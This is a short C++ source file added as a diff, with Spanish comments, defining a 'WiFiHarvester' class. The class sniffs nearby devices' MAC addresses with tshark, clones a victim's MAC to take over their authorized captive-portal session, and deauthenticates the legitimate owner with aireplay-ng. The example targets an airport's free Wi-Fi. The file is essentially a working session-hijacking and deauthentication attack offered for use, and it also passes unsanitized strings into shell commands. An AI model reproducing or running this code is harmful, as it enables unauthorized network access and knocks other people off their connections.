@@ -1,0 +1,47 @@
+#include <iostream>
+#include <string>
+#include <vector>
+#include <thread>
+
+class WiFiHarvester {
+public:
+    // Escanea la red buscando "Blancos de Identidad" (dispositivos con internet)
+    void find_authorized_targets() {
+        std::cout << "📡 Escaneando dispositivos autorizados en el área..." << std::endl;
+        // Usamos tshark o airodump-ng integrado en tu Kali/Arch
+        system("tshark -i wlan1 -n -T fields -e eth.src -e dot11.probes.ssid -c 20 > targets.txt");
+    }
+
+    // "Secuestra" la sesión clonando la MAC y forzando la desconexión del original
+    void hijack_session(std::string target_mac, std::string ssid) {
+        std::cout << "🎭 Clonando identidad: " << target_mac << " en red: " << ssid << std::endl;
+        
+        // 1. Bajamos nuestra interfaz
+        system("ip link set wlan1 down");
+        
+        // 2. Cambiamos nuestra MAC por la del dispositivo autorizado
+        system(("ip link set wlan1 address " + target_mac).c_str());
+        
+        // 3. Subimos y conectamos (el portal creerá que somos el usuario original)
+        system("ip link set wlan1 up");
+        system(("nmcli dev wifi connect " + ssid).c_str());
+        
+        std::cout << "✅ Sesión secuestrada con éxito. Navegando como: " << target_mac << std::endl;
+    }
+
+    // Ataque de Desautenticación para "patear" al dueño original si es necesario
+    void deauth_original_owner(std::string target_mac, std::string ap_mac) {
+        std::cout << "⚡ Desconectando al dueño original para evitar conflictos de IP..." << std::endl;
+        system(("aireplay-ng -0 5 -a " + ap_mac + " -c " + target_mac + " wlan1mon").c_str());
+    }
+};
+
+int main() {
+    WiFiHarvester harvester;
+    harvester.find_authorized_targets();
+    
+    // Ejemplo: Secuestrar la conexión de una laptop autorizada detectada
+    harvester.hijack_session("AA:BB:CC:DD:EE:FF", "Airport_Free_WiFi");
+    
+    return 0;
+}
